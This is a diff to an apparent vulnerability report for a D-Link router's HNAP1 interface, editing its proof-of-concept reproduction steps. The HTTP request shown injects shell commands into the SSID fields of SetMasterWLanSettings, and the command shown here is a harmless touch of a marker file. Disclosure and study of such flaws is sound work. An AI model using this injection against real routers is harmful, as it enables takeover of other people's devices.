@@ -16,7 +16,7 @@ Reproduction Steps:
 1. Go to your wi-fi router gateway [i.e: http://192.168.0.1]
 1. login with admin
 1. Send http request with admin cookies,
-1. this POC will create a file /tmp/testrce.php:
+1. this POC will create a file /tmp/testrce.php and /tmp/testrce1.php:
 ```
 POST /HNAP1/ HTTP/1.1
 Host: 192.168.0.1
@@ -33,7 +33,7 @@ DNT: 1
 X-Forwarded-For: 8.8.8.8
 Connection: close
 
-{"SetMasterWLanSettings":{"wl(1).(0)_ssid":"111;touch /tmp/testrce.php","wl(0).(0)_ssid":"assssss;touch /tmp/2233"}}
+{"SetMasterWLanSettings":{"wl(1).(0)_ssid":"111;touch /tmp/testrce.php","wl(0).(0)_ssid":"assssss;touch /tmp/testrce1.php"}}
 ```
 1. The vulnerable code is in file /squashfs-root/www/HNAP1/control/SetMasterWLanSettings.php.
 ![](dlink3.png)
